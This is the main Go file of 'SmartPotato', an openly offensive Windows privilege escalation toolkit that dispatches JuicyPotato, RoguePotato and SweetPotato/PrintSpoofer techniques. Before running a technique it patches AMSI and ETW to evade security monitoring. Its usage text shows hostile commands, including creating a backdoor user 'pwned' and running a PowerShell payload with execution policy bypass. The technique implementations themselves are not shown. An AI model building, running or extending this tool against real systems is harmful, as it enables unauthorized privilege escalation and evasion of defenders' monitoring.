// SmartPotato is a unified Windows potato privilege escalation tool.
// It auto-detects the environment and dynamically selects between JuicyPotato,
// RoguePotato, and SweetPotato/PrintSpoofer techniques.
//
// Build for Windows: GOOS=windows GOARCH=amd64 go build -o smartpotato.exe
package main

import (
	"fmt"
	"os"
	"runtime"
	"time"
)

func main() {
	if len(os.Args) < 2 {
		fmt.Println("SmartPotato — Unified potato privilege escalation toolkit")
		fmt.Println()
		fmt.Println("Usage: smartpotato <technique> [command]")
		fmt.Println()
		fmt.Println("Techniques:")
		fmt.Println("  auto    — Auto-detect best technique for current environment")
		fmt.Println("  juicy   — JuicyPotato (BITS COM object abuse)")
		fmt.Println("  rogue   — RoguePotato (OXID resolver redirection)")
		fmt.Println("  sweet   — SweetPotato/PrintSpoofer (named pipe impersonation)")
		fmt.Println()
		fmt.Println("Examples:")
		fmt.Println("  smartpotato auto \"cmd /c whoami\"")
		fmt.Println("  smartpotato sweet \"cmd /c net user pwned Password1! /add\"")
		fmt.Println("  smartpotato juicy \"powershell -ep bypass -file payload.ps1\"")
		fmt.Println()
		fmt.Printf("Platform: %s/%s | PID: %d\n", runtime.GOOS, runtime.GOARCH, os.Getpid())
		return
	}

	tech := os.Args[1]
	command := "cmd /c whoami"
	if len(os.Args) > 2 {
		command = os.Args[2]
	}

	fmt.Printf("[*] SmartPotato | technique=%s | platform=%s/%s | pid=%d\n",
		tech, runtime.GOOS, runtime.GOARCH, os.Getpid())
	fmt.Printf("[*] Command: %s\n\n", command)

	// Pre-exploitation evasion
	patchAMSI()
	patchETW()
	fmt.Println()

	time.Sleep(200 * time.Millisecond)

	if tech == "auto" {
		tech = detectBestTechnique()
	}

	var err error
	switch tech {
	case "juicy":
		err = juicyPotato(command)
	case "rogue":
		err = roguePotato(command)
	case "sweet":
		err = sweetPotato(command)
	default:
		fmt.Printf("[!] Unknown technique: %s\n", tech)
		os.Exit(1)
	}

	if err != nil {
		fmt.Printf("[!] %s failed: %v\n", tech, err)
		os.Exit(1)
	}

	fmt.Println("\n[+] SmartPotato execution complete")
}
